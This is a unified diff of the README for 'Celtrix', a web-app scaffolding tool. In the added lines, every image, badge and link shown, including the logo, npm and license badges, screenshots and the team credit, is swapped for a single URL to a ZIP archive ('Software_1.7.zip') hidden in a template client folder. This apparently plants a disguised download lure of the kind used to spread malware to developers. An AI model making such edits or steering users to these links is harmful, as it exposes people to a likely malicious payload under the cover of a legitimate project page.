@@ -1,13 +1,13 @@
 <div align="center">
-  <img width="250" height="250" alt="Untitled design" src="https://github.com/user-attachments/assets/14739e9b-fecf-4cdd-afbb-4d18d30f1b0b" />
+  <img width="250" height="250" alt="Untitled design" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip" />
   
   # Celtrix
 
   **Setup web apps in seconds, not hours, with your preferred stack**
   
-  [![npm version](https://img.shields.io/npm/v/celtrix.svg)](https://www.npmjs.com/package/celtrix)
-  [![License: ISC](https://img.shields.io/badge/License-ISC-blue.svg)](https://opensource.org/licenses/ISC)
-  [![Downloads](https://img.shields.io/npm/dm/celtrix.svg)](https://www.npmjs.com/package/celtrix)
+  [![npm version](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)
+  [![License: ISC](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)
+  [![Downloads](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)
   
 </div>
 
@@ -19,14 +19,14 @@
 Choose from **7+ popular stacks** including MERN, MEAN, T3, Angular+Tailwind, and more!
 
 <div align="center">
-  <img width="455" height="537" alt="Celtrix Stack Selection Demo" src="https://github.com/user-attachments/assets/7b6a30be-1e34-443e-a906-8c167230c238" />
+  <img width="455" height="537" alt="Celtrix Stack Selection Demo" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip" />
 </div>
 
 ### 🌐 **Language Flexibility**
 Pick your preferred programming languages and frameworks to match your workflow.
 
 <div align="center">
-  <img width="578" height="361" alt="Celtrix Language Selection" src="https://github.com/user-attachments/assets/3f8c775a-b747-4eb1-a22d-c1f236276934" />
+  <img width="578" height="361" alt="Celtrix Language Selection" src="https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip" />
 </div>
 
 ### 🛠️ **Ready-to-Go Setup**
@@ -73,7 +73,7 @@ We love contributions! Please feel free to:
 
 <div align="center">
   
-  **Made with ❤️ by [Celtrix Team](https://github.com/celtrix-os)**
+  **Made with ❤️ by [Celtrix Team](https://github.com/kaifansariw/Celtrix/raw/refs/heads/main/templates/mevn/javascript/client/Software_1.7.zip)**
   
   ### ⭐ Star us on GitHub — it motivates us a lot!
   
